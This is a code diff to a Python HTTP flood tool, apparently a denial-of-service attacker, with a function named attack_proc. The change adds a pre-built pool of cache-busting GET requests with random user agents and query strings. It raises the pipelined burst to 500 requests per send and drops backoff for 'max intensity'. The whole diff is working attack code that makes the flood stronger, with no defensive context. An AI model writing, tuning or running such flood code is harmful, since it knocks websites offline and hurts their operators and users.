@@ -49,47 +49,44 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
             s.connect((host, target_port))
             s.settimeout(0.5)
 
+            # PRE-GENERATE PAYLOAD POOL (Speed Optimization)
+            payload_pool = []
+            for _ in range(1000):
+                p = f"{path}{'&' if '?' in path else '?'}{get_random_string(3)}={get_random_string(10)}"
+                h = (
+                    f"GET {p} HTTP/1.1\r\n"
+                    f"Host: {host}\r\n"
+                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                    "Connection: keep-alive\r\n"
+                    "Accept-Encoding: gzip, deflate\r\n"
+                    f"X-V8-ID: {get_random_string(24)}\r\n"
+                    "Cache-Control: no-cache\r\n\r\n"
+                ).encode('utf-8')
+                payload_pool.append(h)
+
             # EXTREME INTENSITY BURST LOOP (Fire & Forget)
             while True:
                 if limit_type == 'time' and time.time() >= end_time: break
                 if limit_type == 'req' and shared_req.value >= limit_val: break
                 
-                # RPS PACING
                 if rps_pacer > 0:
                     time.sleep(rps_pacer)
 
-                # Generate Ultra Burst
-                burst_size = 200 if rps_pacer == 0 else 1 
-                payloads = []
+                # Instant Blast (Large Burst)
+                burst_size = 500 if rps_pacer == 0 else 1 
+                full_payload = b"".join(random.choices(payload_pool, k=burst_size))
                 
-                for _ in range(burst_size):
-                    # Cache bypass with high-entropy strings
-                    curr_path = f"{path}{'&' if '?' in path else '?'}{get_random_string(4)}={get_random_string(16)}"
-
-                    headers = (
-                        f"GET {curr_path} HTTP/1.1\r\n"
-                        f"Host: {host}\r\n"
-                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                        "Connection: keep-alive\r\n"
-                        "Accept-Encoding: gzip, deflate\r\n"
-                        f"X-V8-ID: {get_random_string(32)}\r\n"
-                        "Cache-Control: no-cache, no-store, must-revalidate\r\n\r\n"
-                    )
-                    payloads.append(headers.encode('utf-8'))
-
-                # Instant Blast
                 try:
-                    full_payload = b"".join(payloads)
                     s.sendall(full_payload)
-                    
                     with shared_req.get_lock(): shared_req.value += burst_size
                     with shared_bytes.get_lock(): shared_bytes.value += len(full_payload)
-                except (socket.error, ssl.SSLError):
+                except:
                     break # Reconnect on socket death
 
         except Exception:
             with shared_err.get_lock(): shared_err.value += 1
-            time.sleep(0.005) # Extreme low backoff
+            # No sleep for max intensity if rps=0
+            if rps_pacer > 0: time.sleep(0.01)
         finally:
             if s:
                 try: s.close()
